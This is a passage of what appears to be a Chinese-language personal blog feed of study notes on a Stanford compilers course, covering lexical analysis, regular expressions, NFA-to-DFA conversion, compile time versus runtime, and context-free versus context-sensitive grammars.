aria-hidden="true">image-20230625224323367</figcaption></figure><p>看一个编程语言的例子:</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230625224931669.png"alt="image-20230625224931669" /><figcaption aria-hidden="true">image-20230625224931669</figcaption></figure><p>一旦句子的结构清晰了，就可以尝试去理解它的意思，compilers performlimited semantic analysis to catch inconsistencies.</p><p>🌰：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Jack </span>said <span class="hljs-keyword">Jerry </span>left his assignments <span class="hljs-built_in">at</span> home<br>这个句子里his指代不明确<br><br><span class="hljs-keyword">Jack </span>said <span class="hljs-keyword">Jack </span>left his assignment <span class="hljs-built_in">at</span> home ?<br>这个句子里更糟糕了，his可能指第一个<span class="hljs-keyword">Jack，当然也可能是第二个Jack，还有可能是其他人</span><br></code></pre></td></tr></table></figure><p>类比编程语言：定义了作用域限制了二义性</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&#123;<br>int Jack <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>&#123;<br>int Jack <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>cout &lt;&lt; Jack<span class="hljs-comment">;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Compiler perform many semantic checks besides bariable bindings</p><p>eg:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Jack </span>said <span class="hljs-keyword">Jerry </span>left her assignments <span class="hljs-built_in">at</span> home<br></code></pre></td></tr></table></figure><p>a tyoe mismatch between her and Jack, we know thet are differentpeople</p><p>优化在自然语言中该户没有对应的部分，但是有点像简写；优化程序的目的是：运行速度更快，使用内存更少</p><p>简写不是随便的：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> Y * <span class="hljs-number">0</span> <span class="hljs-operator">=</span>&gt; X <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>这是不正确的，Y如果是NaN，那么X应该仍然是NaN，而不是<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>代码生成通常指汇编代码生成，有点类型自然语言里的"翻译"</p><p>现代编译器大多是这样的轮廓，只不过各部分所占据的比重不一样，现代编译器更注重优化：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230625230214905.png"alt="image-20230625230214905" /><figcaption aria-hidden="true">image-20230625230214905</figcaption></figure><h2 id="economy-of-编译器">Economy of 编译器</h2><p>Why are there so many programming langs ？</p><p>Why are there new programming langs ？</p><p>Why is a good programming lang ？</p><h3 id="why-are-there-so-many-programming-langs">Why are there so manyprogramming langs ?</h3><p>不同的领域有着不同的语言需求</p><ul><li><p>比如科学计算，需要好的浮点数处理，快速的矩阵运算和并行，代表语言：FORTRAN(formulatranslation,公式翻译)</p></li><li><p>商业应用：需要数据分析和报表，代表语言：sql</p></li><li><p>系统编程：需要实时性，与操作系统打交道，C/C++</p></li></ul><h3 id="why-are-there-new-programming-langs">Why are there newprogramming langs</h3><ul><li>程序员的训练是一门语言的主要成本</li><li>很容易开始一门新的语言</li><li>新的领域产生，新的语言更适用于新的领域</li></ul><h3 id="why-is-a-good-programming-lang">Why is a good programming lang？</h3><p>没有统一的标准去规定哪种语言是最好的语言</p><h2 id="cool语法">Cool语法</h2><p>wip</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 2 Lexical Analysis</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%8C/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">编写代码时：<br>if (i == j)<br>z = 0;<br>else<br>z = 1;<br><br>实际喂给leximal analyzer的:<br><span class="hljs-symbol">\t</span>if (i == i)<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span><span class="hljs-symbol">\t</span>z=0;<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span>else<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span><span class="hljs-symbol">\t</span>z=1;<br></code></pre></td></tr></table></figure><p>Token Class</p><ul><li><p>In English: Noun, Verb, Adjective</p></li><li><p>In Programming language: Identifier, Keywords, '(', ')'</p></li></ul><p>Token Class correspond to set of strings</p><ul><li><p>[token class]: [set of strings]</p></li><li><p>Identifier: strings of letters or digits, starting with aletter</p></li><li><p>Integer: a non-empty string of digits</p></li><li><p>Keyword: 'else' or 'if'</p></li><li><p>whitespace: a non-empty sequence of blanks, newlines, andtabs</p></li></ul><p>Lexical analyzer的主要功能：</p><ul><li><p>Classify program substrings according to role(TokenClass)</p></li><li><p>Communicate tokens to the parser</p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span> =&gt; LA =&gt; Parser<br>token: &lt;<span class="hljs-keyword">class</span>, <span class="hljs-symbol">string</span>&gt;<br><br><span class="hljs-symbol">foo</span> = <span class="hljs-symbol">42</span> =&gt; &lt;<span class="hljs-symbol">ID, </span>&#x27;<span class="hljs-symbol">foo</span>&#x27;&gt;, &lt;<span class="hljs-symbol">OP, </span>&#x27;=&#x27;&gt;, &lt;<span class="hljs-symbol">INT, </span>&quot;<span class="hljs-symbol">42</span>&quot;&gt;<br></code></pre></td></tr></table></figure><p>An implementation must do two things:</p><ol type="1"><li>Recognize substrings corresponding to tokens(切割成一个个子串(专业名词：词素))</li><li>Identify the token class of each lexeme (为这些子串分配Tokenclass)</li></ol><p>最终形成的就是以下输出：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">tokens: [token1, token2]<br><span class="hljs-keyword">token</span>: &lt;<span class="hljs-keyword">token</span> <span class="hljs-keyword">class</span>, lexeme&gt;<br></code></pre></td></tr></table></figure><h2 id="regular-language">Regular Language</h2><p>正则语言用于规定编程语言的词法结构</p><p>词法结构本质上就是一组token classes</p><p>所以我们必须要定义这样一些规则：什么样的字符串属于某一类tokenclass（这样的规则就是正则表达式）</p><p>比如：</p><p><span class="math inline">\(single \quad character:\{c\}\)</span></p><p><span class="math inline">\(Epsilon: \{&#39;&#39;\}\)</span></p><p><span class="math inline">\(Union: A+B = \{a|a \in A\} \cup \{b|b \inB\}\)</span></p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230628232115530.png"alt="image-20230628232115530" /><figcaption aria-hidden="true">image-20230628232115530</figcaption></figure><p>基于字符集sigma的正则表达式集合：</p><p><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230628232258693.png"alt="image-20230628232258693" />这个描述正则表达式的带竖线的语法叫做文法（grammar)</p><p>同一个集合可以由不同的方法表示出来。</p><p>如：1* = 1* + 1，因为1*= {'', 1, 11, 111}, 而1* +1（注意这里的+不是连接的意思，而是并集），{'', 1, 11, 111} U {1} = {'',1, 11, 111},不变</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230628233030413.png"alt="image-20230628233030413" /><figcaption aria-hidden="true">image-20230628233030413</figcaption></figure><h3 id="conclusion">Conclusion：</h3><p>正则表达式指定了正则语言</p><p>正则表达式5个组成部分：</p><ul><li><p>Two base cases: empty and 1-character strings</p></li><li><p>Three compound expressions: union concatenatation anditeration</p></li></ul><h2 id="形式语言">形式语言：</h2><p><ahref="https://zhuanlan.zhihu.com/p/47583941">形式语言与自动机——形式语言- 知乎 (zhihu.com)</a></p><p><ahref="https://blog.csdn.net/hencoff/article/details/7515047">(163条消息)自然语言和形式语言 （包含各种术语的区别）_Hencoff的博客-CSDN博客</a></p><p>定义：let <span class="math inline">\(\Sigma\)</span> be a set ofcharacters (an alphabet)</p><p>A language over <span class="math inline">\(\Sigma\)</span> is a setof strings of characters drawn from <spanclass="math inline">\(\Sigma\)</span></p><p>简而言之，所以形式语言其实就是字符集上的任何一组字符串，正则表达式是形式语言的一种</p><p>如：alphabet：英文字符</p><p>lang: 英语句子</p><p>上面的例子不是，因为英文单词的定义是没有规则的</p><p>如：alphabet：ascii</p><p>language: C program</p><p><strong>映射函数</strong>：L maps syntax to semantics</p><p><span class="math inline">\(L(e) = M\)</span></p><p><span class="math inline">\(e =&gt; re(regular \quadexpression)\)</span></p><p><span class="math inline">\(M =&gt; set \quad of \quadstrings\)</span></p><p>实际上之前的</p><p><span class="math inline">\(A+B = A \cup B就是这样一套map函数，其本质上就是：L(A+B) = L(A) \cup \L(B)\)</span></p><p>Why use a meaning function ?</p><ul><li>划分了syntax和semantics</li><li>可以把notation作为一个独立的问题</li><li>因为表达式(文法)和meanings并不是一对一的关系(可能是多对一，但不会是一对多，这样会出现二义性)</li></ul><h2 id="lexical-specification">Lexical specification</h2><p>Keyword: 'if' or 'else' or 'then'</p><p>Integar: digit = '0' + '1' + ... + '9', digit digit* = digit+</p><p>identifier: letter = [a-zA-Z], letter(letter+digit)*</p><p>Whitespace: (' ' + '' + ')+</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230629233242362.png"alt="image-20230629233242362" /><figcaption aria-hidden="true">image-20230629233242362</figcaption></figure><p>正则表达式描述了许多常规语言，如电话号码，邮件等等</p><p>regular languages are a language specification:正则语言描述了一些符合特定规则的语言</p><p>Given a string s and a rexp R, is <span class="math inline">\(s \inL(R)?\)</span></p><p>为了回答上面这个问题，我们来整理下：</p><h3 id="一些基本的正则表达式">一些基本的正则表达式</h3><p>At least one: $ A+ AA*$</p><p>Union: $ A|B A + B$</p><p>Option: $ A? A + $</p><p>Range: $ 'a' + 'b' + ... + 'z' $</p><p>Exclude range: $ complement of [a-z] $</p><p>具体步骤：</p><blockquote><ol type="1"><li>Write a rexp for lexemes of each token class:</li></ol><p>​ Number = digit+</p><p>​ Keyword = 'if' + 'else' + ...</p><p>​ ...</p><ol start="2" type="1"><li>Contruct R, matching all lexemes for all tokens</li></ol><p>​ R = keyword + idenfier + Number ... = R1 + R2 + ... Rn(所有正则取并集)</p><ol start="3" type="1"><li><p>Let input be x1...xn</p><p>For $1 &lt;= i &lt;= n check x1...xi L(R) $</p></li><li><p>if success, then we know that</p></li></ol><p>​ <span class="math inline">\(x1...xi \in L(Rj) \quad for \quad some\quad j\)</span></p><ol start="5" type="1"><li>Remove x1...xi from input and go to (3)</li></ol></blockquote><p><strong>How much input is need ?</strong></p><p>就像人类读取一样，贪婪的，以==和=为例，双等号出现的时候使用两个等号作为一个匹配整体</p><p><span class="math inline">\(x_1...xi \in L(R)\)</span></p><p><span class="math inline">\(x_1...xj \in L(R)\)</span></p><p><span class="math inline">\(i != j\)</span></p><p>select which t = max(i, j)</p><p><strong>Which token is used ?</strong></p><p><span class="math inline">\(x_1...xi \in L(R_i)\)</span></p><p><span class="math inline">\(x_1...xi \in L(R_j)\)</span></p><p>可以按照优先级，哪个最先出现使用哪个</p><p><strong>what if no rule matches ?</strong></p><p>Error = [all strings not in the lexical specification] as last inpriority</p><p>如果所有的token class都不满足，最后由Error兜底</p><h3 id="conclusion-1">Conclusion</h3><ul><li>Regular expressions are a concise notation for strings patterns</li><li>Use in lexical analysis requires small extensions<ul><li>To resolve ambiguities [matches as long as possible]</li><li>To handle errors [highest priority match]</li></ul></li><li>Good algorithm known<ul><li>Require only single pass over the input(仅仅一次遍历就可以确定每个词素的所属token class)</li><li>Few operations per character (table lookup)</li></ul></li></ul><h2 id="finite-automata">Finite automata</h2><p>Rexp = specifications (正则表达式作为词法分析的规范语言)</p><p>A finite automation consists of of</p><ul><li><p>An input alphabet <spanclass="math inline">\(\Sigma\)</span></p></li><li><p>A set of states S</p></li><li><p>A start state n</p></li><li><p>A set of accepting states F 包含于S</p></li><li><p>A set of transitions state -&gt; (some input) state</p></li><li><p>Transition (状态转移)</p></li></ul><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702223309277.png" alt="image-20230702223309277" style="zoom:50%;" /></p><ul><li><p>Is read(读作): In State s1 on input a goto state s2(在状态s1输入字符a将会进入s2状态)</p></li><li><p>if end of input and in accepting state =&gt; accept</p></li><li><p>Otherwise =&gt; reject</p><ul><li><p>在非接受态输入终止了</p></li><li><p>在某一个状态无法进行状态转移</p></li></ul></li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230630233026614.png"alt="image-20230630233026614" /><figcaption aria-hidden="true">image-20230630233026614</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230630233102794.png"alt="image-20230630233102794" /><figcaption aria-hidden="true">image-20230630233102794</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230630233131470.png"alt="image-20230630233131470" /><figcaption aria-hidden="true">image-20230630233131470</figcaption></figure><blockquote><p>For some reason we're about to read x2 when we make an epsilon movethe machine change state, but the input pointer stays in exactly thesame place. So the new configuration of the machine would be that we'rein state b. But our input pointer is still waiting to read x2. So youcan think of epsilon move is a kind of free move for the machine. It canmove to a different state without consuming any input.</p><p>Just to be clear here, the machne does not have to make the epsilonmove. It's a choice. So we can decide whether to make the epsilon moveor not. Now, epsilon move was the first time we're mentioned thepossibility that a finite automaton might have a choice in what moves itmakes</p></blockquote><p>上面的叫做有选择的自动机</p><p>有选择的自动机(NFA)和没有选择的自动机(DFA)</p><p>确定性自动机：</p><ul><li><p>不存在选择，如epsilon move(因为epsilonmove实际上本身就是一种选择)</p></li><li><p>one transition per input per state</p></li><li><p>A DFA takes only one path through the state graph:</p></li></ul><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702223139657.png" alt="image-20230702223139657" style="zoom:50%;" /></p><p>NFA:</p><ul><li>Can have multiple transitions for one input in a given state</li><li>Can have <span class="math inline">\(\epsilon-moves\)</span></li><li>An NFA can choose:</li></ul><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702223124224.png" alt="image-20230702223124224" style="zoom:50%;" /></p><p>NFA只要有一条path可以到达acceptstate，那么就说这个input属于这个nfa所代表的语言</p><p><strong>Conclusion</strong></p><ul><li>NFAs and DFAs recognize the same setg of language: regularlanguages</li><li>DFAs are faster to execute: there are no choices to consider</li><li>BFAs are , in general, smaller</li></ul><blockquote><p>epsilon move</p></blockquote><h2 id="rexp-2-nfa">Rexp 2 NFA</h2><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">Lexical specification =&gt; Regular expression =&gt; NFA =&gt; DFA =&gt; <span class="hljs-keyword">Table</span>-driven implementation of DFA<br></code></pre></td></tr></table></figure><p>For each kind of rexp, define an equalvalent NFA: NFA for rexp M</p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221029097.png" alt="image-20230702221029097" style="zoom:50%;" /></p><p>For <span class="math inline">\(\epsilon\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221052123.png" alt="image-20230702221052123" style="zoom:50%;" /></p><p>For <span class="math inline">\(a\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221104220.png" alt="image-20230702221104220" style="zoom:50%;" /></p><p>如何联合？</p><p>we add an epsilon transition to the start state of B. What that saysis that first few recognize some portion of the input that belongs tothe language of a(我们已经识别了前面一个正则表达式，希望不消耗掉任何一个字符跳转到另一个正则表达式).And when we get to what we've been the final state of a, we can jump tothe start state of b without consuming any input and try to read therest of the string as part of the string in the language of B.</p><p>For <span class="math inline">\(AB\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221203335.png" alt="image-20230702221203335" style="zoom:50%;" /></p><p>For <span class="math inline">\(A+B\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221219541.png" alt="image-20230702221219541" style="zoom:50%;" /></p><p>For <span class="math inline">\(A^*\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221643107.png" alt="image-20230702221643107" style="zoom:50%;" /></p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702161855178.png"alt="image-20230702161855178" /><figcaption aria-hidden="true">image-20230702161855178</figcaption></figure><h2 id="nfa-2-dfa">NFA 2 DFA</h2><p><strong><spanclass="math inline">\(\epsilon-closure\)</span></strong></p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702231414583.png"alt="image-20230702231414583" /><figcaption aria-hidden="true">image-20230702231414583</figcaption></figure><p>An NFA may be in many states at any time (NFA在同一刻可能有多个状态，比如下面的起始点有ABCDHI)</p><p>How many different states ?</p><p>NFA有N个不同的状态，子集种类最大有<spanclass="math inline">\(2^N\)</span>（包含空集） <spanclass="math display">\[N \quad states \\|S| \le N \\2 ^{N} - 1 \quad non-empty \quad subsets\]</span></p><p>$$ NFA: \ states: S \ start: s S \ final: F S \ a(X) = {y | x X_n xy}</p><p>\ \ \ \</p><p>DFA: \ states: subsets of S \ start: -closure(s) \ final: {X | X F }\ X Y if Y = -closure(a(X)) $$</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">NFA:</span><br><span class="hljs-symbol">states:</span> S<br><span class="hljs-symbol">start:</span> s <span class="hljs-keyword">in</span> S<br><span class="hljs-symbol">final:</span> F 包含于S<br>a(<span class="hljs-built_in">X</span>) = &#123;<span class="hljs-built_in">y</span> | <span class="hljs-built_in">x</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">X</span> <span class="hljs-built_in">x</span> -&gt;(a) <span class="hljs-built_in">y</span>&#125;<br><br><br></code></pre></td></tr></table></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702225328912.png"alt="image-20230702225328912" /><figcaption aria-hidden="true">image-20230702225328912</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702225314437.png"alt="image-20230702225314437" /><figcaption aria-hidden="true">image-20230702225314437</figcaption></figure><p>DFA can be impl by a 2D table T</p><ul><li>One dimension is states</li><li>Other dimension is input symbol</li></ul><p>For every transition $ s_i s_k $ define <spanclass="math inline">\(T[i, a] = k\)</span></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pf">i = <span class="hljs-number">0</span> 控制字符的指针<br><span class="hljs-keyword">state</span> = <span class="hljs-number">0</span> 控制状态<br>while (input[i]) &#123;<br><span class="hljs-keyword">state</span> = A[<span class="hljs-keyword">state</span>, input[i++]];<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702232859459.png" alt="image-20230702232859459" style="zoom:50%;" /></p><table><thead><tr class="header"><th></th><th>0</th><th>1</th></tr></thead><tbody><tr class="odd"><td>S</td><td>T</td><td>U</td></tr><tr class="even"><td>T</td><td>T</td><td>U</td></tr><tr class="odd"><td>U</td><td>T</td><td>U</td></tr></tbody></table><p>如果觉得states太多，表太大，可以考虑共享内存和链表的方式存储表结构，对于N个states的NFA来说最多需要<spanclass="math inline">\(2^N - 1\)</span> 对应的DFA states</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702232401012.png"alt="image-20230702232401012" /><figcaption aria-hidden="true">image-20230702232401012</figcaption></figure><p>这个时候states(行数)为NFA的states数量</p><p><strong>Conclusion</strong></p><ul><li>NFA -&gt; DFA conversion is key</li><li>Tools trade between speed and space<ul><li>DFAs: faster, less compact</li><li>NFAs: slower, concise</li></ul></li></ul><h2 id="conclusion-2">Conclusion</h2><p>怎么实现</p><p>自动机的应用（本质上是保存状态，进行状态转移）</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 12 Conclusion</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%BA%8C/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<p>运行时和编译时的划分及概念（广义和狭义）？</p><p>compile: The instructions or <strong>source code written usinghigh-level language is required to get converted to machine code for acomputer to understand.</strong> During compile time, the source code istranslated to a byte code like from <ahref="https://www.baeldung.com/java-classes-objects">.java to.class</a>. During compile time the compiler check for the syntax,semantic, and type of the code.</p><h3 id="inputs-and-outputs">Inputs and Outputs</h3><p>Inputs and outputs during compile time are the following:</p><ul><li><strong>Inputs –</strong> Source code, dependent files, interfaces,libraries required for successful compilation of the code</li><li><strong>Outputs –</strong> On successful compilation, a compliedcode (<ahref="https://www.sciencedirect.com/topics/computer-science/assembly-code">assemblycode</a> or <ahref="https://www.cs.tufts.edu/comp/40/calendar/lectures/05-CompilationSteps.pdf">relocatableobject code</a>), otherwise <ahref="https://student.cs.uwaterloo.ca/~cs133/Resources/Java/Debugging/compile.shtml">compiletime error</a> messages</li></ul><p>Errors: <strong>During compile time errors occur because of syntaxand semantic.</strong> The syntax error occurs because of the wrongsyntax of the written code. Semantic errors occur in reference tovariable, function, type declarations and type checking.</p><p>简单来说，就是把源代码编译成计算器可以理解的语言，就是编译，注意这里计算机可以理解的语言不一定是汇编和机器码什么的，也可以是与特定操作系统无关的中间语言(字节码)，这个时候可以把这些执行字节码的解释器或者虚拟机理解一个小型的操作系统。</p><p>Runtime:</p><p><strong>A program’s life cycle is a runtime when the program is inexecution.</strong> Following are the different types of runtimeerrors:</p><ul><li><strong>Division by zero</strong> – when a number is divided by zero(0)</li><li><strong>Dereferencing a null pointer</strong> – when a programattempts to access memory with a NULL</li><li><strong>Running out of memory</strong> – when a computer has nomemory to allocate to programs</li></ul><figure><imgsrc="https://www.baeldung.com/wp-content/ql-cache/quicklatex.com-25c5794ab97de69a698576bf136da63a_l3.svg"alt="Rendered by QuickLaTeX.com" /><figcaption aria-hidden="true">Rendered by QuickLaTeX.com</figcaption></figure><p>静态作用域和动态作用域的实现有什么不同？</p><p>静态类型检查和动态类型检查:</p><p>首先得先明确什么是编译时什么是运行时，</p><p>一般的运行时表示从上至下执行汇编代码，但还有些运行时包含中间代码执行时的运行时，举个例子：</p><p>Python =&gt; (编译) pyc(中间代码文件) =&gt; (解释器解释执行) 结果</p><p>这里的pyc =&gt;结果就是运行时，这一步其实包含了把中间代码转为汇编or机器指令的过程，以及优化和类型检查，垃圾回收等，但其实用户感知不到这些过程，感觉好像字节码直接被运行了，所以这些也被包含在运行时里，</p><p>思考：编译+AI优化？</p><p>上下有关文法的理解，什么语言会用上下有关文法，上下无关文vs上下有关文法的比较，各有什么特点</p><p>题主的主要疑惑应该在于：什么是上下文，上下文在哪里？为什么说这个文法上下文无关？</p><p>答案就是：在应用一个产生式进行推导时，前后已经推导出的部分结果就是上下文。上下文无关的意思的，只要文法的定义里有某个产生式，不管一个<ahref="https://www.zhihu.com/search?q=非终结符&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">非终结符</a>前后的串是什么，就可以应用相应的产生式进行推导。（从形式上来看，就是产生式的左边都是单独一个非终结符，即形如S-&gt; ...，而不是非终结符左右还有别的东西，例如 aSb -&gt; ...）</p><p>作者：Quokka链接：https://www.zhihu.com/question/21833944/answer/307309365来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>这么描述有点儿抽象，我举一个<ahref="https://www.zhihu.com/search?q=自然语言&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">自然语言</a>的例子：</p><p><strong><ahref="https://www.zhihu.com/search?q=上下文无关文法&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">上下文无关文法</a>：</strong></p><p>产生式：</p><p>Sent -&gt; S V O</p><p>S -&gt; 人 | 天</p><p>V -&gt; 吃 | 下</p><p>O -&gt; 雨 | 雪 | 饭 | 肉</p><p>其中英文字母都是非终结符（SVO 分别表示<ahref="https://www.zhihu.com/search?q=主谓宾&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">主谓宾</a>），汉字都是终结符。</p><p>这个文法可以生成如下句子（共 2<em>2</em>4=16种组合，懒得写全了，简单写 7 种意思意思）：</p><p>｛人吃饭，天下雨，人吃肉，天下雪，人下雪，天下饭，天吃肉，……｝</p><p>可以看到，其中有一些搭配在语义上是不恰当的，例如“天吃肉”。其（最左）推导过程为：</p><p>Sent -&gt; SVO -&gt; <ahref="https://www.zhihu.com/search?q=天VO&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">天VO</a>-&gt; 天吃O -&gt; 天吃肉</p><p>但是上下文无关文法里，因为有“V -&gt; 吃 | 下”这样一条产生式，V就永远都可以推出“吃”这个词，它并不在乎应用“V -&gt; 吃 |下”这个产生式进行推导时 V 所在的上下文（在这个例子里，就是”天VO“中 V左右两边的字符串”天“和”O“）。事实上，在 V推出“吃”这一步，它的左边是“天”这个词，而”天“和”吃“不搭配，导致最后的句子读起来很奇怪。</p><p>那<strong><ahref="https://www.zhihu.com/search?q=上下文有关文法&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">上下文有关文法</a></strong>呢？产生式可以定义为（其中前两条产生式仍是上下文无关的，后四条则是上下文有关的）：</p><p>Sent -&gt; S V O</p><p>S -&gt; 人 | 天</p><p>人V -&gt; 人吃</p><p>天V -&gt; 天下</p><p>下O -&gt; 下雨 | 下雪</p><p>吃O -&gt; 吃饭 | 吃肉</p><p>可以看到，这里对 V 的推导过程施加了约束：虽然 V还是能推出”吃“和”下“两个词，但是仅仅当 V左边是”人“时，才允许它推导出”吃“；而当 V左边是”天“时，允许它推导出”下“。这样通过上下文的约束，就保证了主谓搭配的一致性。类似地，包含O 的产生式也约束了动宾搭配的一致性。</p><p>这样一来，这个语言包含的句子就只有｛<ahref="https://www.zhihu.com/search?q=人吃饭，天下雨，人吃肉，天下雪&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">人吃饭，天下雨，人吃肉，天下雪</a>｝这四条，都是语义上合理的。</p><p>以”人吃饭“为例，推导过程为：</p><p>Sent -&gt; SVO -&gt; <ahref="https://www.zhihu.com/search?q=人VO&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">人VO</a>-&gt; 人吃O -&gt; 人吃饭</p><p>其中第三步推导是这样的：非终结符 V 的上文是“人”，因此可以应用“人V-&gt; 人吃”这条产生式，得到“人VO -&gt; 人吃O”。第四步也类似。</p><p>而</p><p><ahref="http://www.zhihu.com/people/20529960b7c64153695a7488fb49aeab"><spanclass="citation" data-cites="范彬">@范彬</span></a></p><p>回答的是语法的歧义性，这和 CFG 无关。最简单的例子：</p><p>假设有如下上下文无关文法：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coq">S -&gt; S1 | <span class="hljs-type">S2</span><br>S1 -&gt; ab<br>S2 -&gt; AB<br>A -&gt; a<br>B -&gt; 